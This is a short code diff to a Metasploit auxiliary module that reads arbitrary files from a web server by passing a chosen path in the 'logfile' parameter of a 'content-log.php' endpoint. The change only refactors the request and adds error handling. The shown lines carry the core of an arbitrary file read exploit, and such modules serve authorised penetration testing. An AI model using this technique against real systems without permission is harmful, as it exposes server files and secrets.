@@ -71,14 +71,18 @@ class MetasploitModule < Msf::Auxiliary
       'functions',
       'content-log.php'
     )
-    route += "?logfile=#{datastore['FILEPATH']}"
 
-    res = send_request_raw({
+    res = send_request_cgi({
       'method' => 'GET',
-      'uri' => route
+      'uri' => route,
+      'vars_get' => {
+        'logfile' => datastore['FILEPATH']
+      }
     })
 
-    unless res.code == 200
+    if res.nil?
+      fail_with(Failure::Unreachable, 'No HTTP response received')
+    elsif res.code != 200
       fail_with(Failure::UnexpectedReply, "Unexpected HTTP status: #{res.code} while attempting to read file")
     end
     if res.body.empty?
